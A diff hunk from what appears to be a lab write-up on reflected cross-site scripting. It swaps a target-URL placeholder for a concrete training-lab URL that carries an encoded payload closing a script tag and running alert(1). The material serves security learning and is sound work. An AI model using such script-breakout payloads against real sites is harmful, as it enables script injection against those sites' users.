@@ -143,7 +143,7 @@ The successful execution of `alert(1)` confirmed the Reflected XSS vulnerability
 **Crafted URL:**
 
 ```text
-<TARGET_URL>/?search=%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+https://0acf006e04b185a3800912400007003d.web-security-academy.net/?search=%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
 ```
 
 **Resulting HTML Structure:**
